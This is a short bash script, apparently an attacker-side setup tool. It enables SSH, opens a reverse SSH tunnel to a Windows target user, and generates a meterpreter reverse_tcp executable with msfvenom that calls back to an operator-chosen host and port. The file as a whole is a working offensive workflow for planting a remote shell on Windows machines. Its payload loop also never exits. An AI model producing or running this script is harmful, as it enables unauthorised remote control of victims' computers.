#!/bin/bash
echo "This program will start a listener for a reverse ssh..."

# Make sure OpenSSH is installed and running
sudo pacman -S --noconfirm openssh
sudo systemctl enable sshd
sudo systemctl start sshd

# Allow SSH through firewall
sudo ufw allow 22/tcp

echo "Setup SSH tunnel? (y/n): "
read setupssh

if [ "$setupssh" != "n" ]; then
  while true; do
    echo -n "Input target username (Windows user): "
    read targetusername
    clear
    echo "You entered $targetusername , correct? y/n :"
    read correction
    if [ "$correction" = "y" ]; then
      # Connect to the Windows host on port 9000
      ssh -p 9000 "$targetusername@localhost"
      break
    elif [ "$correction" = "n" ]; then
      echo "Let's try again..."
    else
      echo "Invalid input..."
    fi
  done

else
  echo "Skipping SSH setup..."
fi

echo "Setup MSFVenom payload? (y/n): "
read setupvenom

if [ "$setupvenom" != "n" ]; then
  while true; do
    echo "Input your IP address for the payload LHOST: "
    read IP
    echo "Input your desired LPORT for the payload: "
    read port
    echo "Generating payload using MSFVenom..."
    # Generate a reverse shell payload using MSFVenom
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f exe -o payload.exe
    echo "Payload generated as payload.exe"
    mkdir VenomPayload
    mv payload.exe VenomPayload/
    echo "Payload moved to VenomPayload directory, if you wish to move it to a different path you can do so."
  done
else
    echo "Skipping MSFVenom payload generation..."
    sleep 2
    echo "If you have a payload.exe file, please place it in the VenomPayload directory."
fi
